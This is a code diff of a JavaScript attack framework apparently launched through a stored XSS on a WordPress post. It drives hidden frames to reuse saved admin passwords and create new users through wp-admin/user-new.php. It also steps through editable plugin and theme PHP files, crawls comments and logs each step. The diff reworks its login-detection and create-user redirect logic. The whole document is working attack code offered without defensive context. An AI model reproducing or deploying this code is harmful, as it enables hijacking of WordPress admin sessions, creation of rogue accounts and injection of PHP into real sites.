@@ -8,14 +8,17 @@ var g_strURLPanelIndex="";
 var g_strURLEditPHPPostPlugin="";
 var g_strURLEditPHPPostTheme="";
 var g_strURLEditPHPArray=null;
+var g_strURLXSS="";
 var g_strUsername="";
 var g_strComunication="";
+
 
 var g_strURLVisitLogsAdd="";
 var g_strURLCommentsAdd="";
 var g_strURLSpysIndex="";
 function initURL()
 {
+    g_strURLXSS=Common.getTargetHost()+"?p=1";
     g_strURLIndex=Common.getTargetHost();
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
@@ -505,31 +508,31 @@ function inPageLogin()
 }
 //--------------------------------------------login page-----------------------------------------------------------------------
 
-//--------------------------------------------index page-----------------------------------------------------------------------
-function inPageIndex()
+//--------------------------------------------inPageRedirect page-----------------------------------------------------------------------
+function inPageRedirect()
 {   //test is login
     var json=
     {
         username:"",
-        action:"view index page"
+        action:"detected not login when try to create user 302 redirect"
     };
-    if($("#wpadminbar").length>0)
-    {   //login already
-        //alert("find child");
-        var $elementUsername=findChild($("#wpadminbar"),[1,1,1,0]);
-        json.username=$elementUsername.text();
-        json.action+=",user login already:"+json.username;
-        window.parent.g_strUsername=json.username;
-        window.parent.g_strComunication="login_already";
-    }
-    else
-    {   //not login
-        window.parent.g_strComunication="not_login";
-        json.action+=",user not login";
-    }
+    //if($("#wpadminbar").length>0)
+    //{   //login already
+    //    var $elementUsername=findChild($("#wpadminbar"),[1,1,1,0]);
+    //    json.username=$elementUsername.text();
+    //    json.action+=",user login already:"+json.username;
+    //    window.parent.g_strUsername=json.username;
+    //    window.parent.g_strComunication="login_already";
+   // }
+   // else
+    //{   //not login
+    //    window.parent.g_strComunication="not_login";
+    //    json.action+=",user not login";
+   // }
+    console.log(json.action);
     addVisitLog(json);
 }
-//--------------------------------------------index page-----------------------------------------------------------------------
+//--------------------------------------------inPageRedirect page-----------------------------------------------------------------------
 
 //common function add visit log
 function addVisitLog(json)
@@ -610,23 +613,10 @@ function frameJumpTo(strURL)
 function frameOperationCalledFromSon(windowSon)
 {
     console.log("frame operation called from son window");
-    if(windowSon.location.href===g_strURLIndex)
+    if(windowSon.location.href.indexOf("redirect_to")!==-1)
     {
-        if(g_strComunication==="not_login")
-        {
-            //not login yet,if auto save password,try to login
-            console.log("detect not login,try to login..");
-            frameJumpTo(g_strURLLogin);
-        }
-        else if(g_strComunication==="login_already")
-        {   //login already
-            frameJumpTo(g_strURLAddUser);
-            console.log("detect login already,try to create user..");
-        }
-        else
-        {
-            console.log("fatal error in index page,unrecognized g_strComunication:"+g_strComunication);
-        }
+        //need login,302redirect to here
+        frameJumpTo(g_strURLLogin);
     }
     else if(windowSon.location.href===g_strURLLogin)
     {
@@ -638,47 +628,19 @@ function frameOperationCalledFromSon(windowSon)
         }
         else if(g_strComunication==="failed"||g_strComunication==="not_save")
         {
+            console.log("up not save,try create user 10s later");
             //check for every 10 seconds
             window.setTimeout
             (
                 function()
                 {
-                    frameJumpTo(g_strURLIndex);
+                    frameJumpTo(g_strURLAddUser);
                 },10000
             );
         }
         else
         {
             console.log("fatle error in login page,unrecognized g_strComunication:"+g_strComunication);
-        }
-    }
-    else if(windowSon.location.href.indexOf(g_strURLComment)!==-1)
-    {
-        if(g_strComunication!=="")
-        {
-            if(g_strComunication==="no_privilege")
-            {
-                //no privileges to show comments
-                console.log("detect no porivilege to show comments,going to control panel")
-                frameJumpTo(g_strURLPanelIndex);
-            }
-            else if(g_strComunication=="can_not_find_error_message")
-            {
-                console.log("detect can not find error message,going to control panel")
-                frameJumpTo(g_strURLPanelIndex);
-            }
-            else
-            {
-                //next page
-                console.log("going to crawl next page comments:"+g_strComunication);
-                frameJumpTo(g_strComunication);
-            }
-        }
-        else
-        {
-            //no more comment
-            //alert("no more comment!");
-            frameJumpTo(g_strURLPanelIndex);
         }
     }
     else if(windowSon.location.href===g_strURLAddUser)
@@ -722,14 +684,65 @@ function frameOperationCalledFromSon(windowSon)
             console.log("going to next editable php file:"+g_strURLEditPHPArray[g_strComunication]);
         }
     }
-    else if(window.location.href.indexOf("wp-login.php?redirect_to")!==-1)
+    else if(windowSon.location.href.indexOf(g_strURLComment)!==-1)
     {
-        //index page logind,but add user show not login ,302redirect to here
-        frameJumpTo(g_strURLLogin);
+        if(g_strComunication!=="")
+        {
+            if(g_strComunication==="no_privilege")
+            {
+                //no privileges to show comments
+                console.log("detect no porivilege to show comments,going to control panel")
+                frameJumpTo(g_strURLPanelIndex);
+            }
+            else if(g_strComunication=="can_not_find_error_message")
+            {
+                console.log("detect can not find error message,going to control panel")
+                frameJumpTo(g_strURLPanelIndex);
+            }
+            else
+            {
+                //next page
+                console.log("going to crawl next page comments:"+g_strComunication);
+                frameJumpTo(g_strComunication);
+            }
+        }
+        else
+        {
+            //no more comment
+            //alert("no more comment!");
+            frameJumpTo(g_strURLPanelIndex);
+        }
     }
+    //else if(windowSon.location.href===g_strURLIndex)
+    //{
+        //if(g_strComunication==="not_login")
+        //{
+            //not login yet,if auto save password,try to login
+        //    console.log("detect not login,try to login..");
+        //    frameJumpTo(g_strURLLogin);
+       // }
+       // else if(g_strComunication==="login_already")
+       //{   //login already
+         //   frameJumpTo(g_strURLAddUser);
+        //    console.log("detect login already,try to create user..");
+        //}
+        //else
+        //{
+        //    console.log("fatal error in index page,unrecognized g_strComunication:"+g_strComunication);
+        //}
+    //}
     else
     {
         throw "unknow position in function frameOperationCalledFromSon:"+windowSon.location.href;
+    }
+}
+//is login already or not
+function isLoginAlready()
+{
+    var bReturn=true;
+    if($("form#loginform").length!==0||$("form.mom-login-form"))
+    {
+        bReturn=false;
     }
 }
 
@@ -737,10 +750,21 @@ function frameOperationCalledFromSon(windowSon)
 function frameOperation()
 {
     console.log("current page new url:"+window.location.href);
-    if(window.location.href===g_strURLIndex)
-    {   //index
-        inPageIndex();
+    if(window.location.href===g_strURLXSS)
+    {
+        //XSS
+        frameJumpTo(g_strURLAddUser);
     }
+    else if(window.location.href.indexOf("redirect_to")!==-1)
+    {
+        //i am sure not login
+        inPageRedirect();
+    }
+    //if(window.location.href===g_strURLIndex)
+    //{   //index
+        //may be the target host is not the same
+        //inPageIndex();
+    //}
     else if(window.location.href===g_strURLLogin)
     {
         //try to login
@@ -765,15 +789,10 @@ function frameOperation()
         //get changable js command
         inPagePanelIndex();
     }
-    else if(window.location.href.indexOf("wp-login.php?redirect_to")!==-1)
-    {
-        //add user then 302 redirect to here,but program suppose to run to here
-        window.parent.frameOperationCalledFromSon(window);
-    }
     //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
     else
-    {   //XSS
-        frameJumpTo(g_strURLIndex);
+    {
+
     }
     // else
     // {
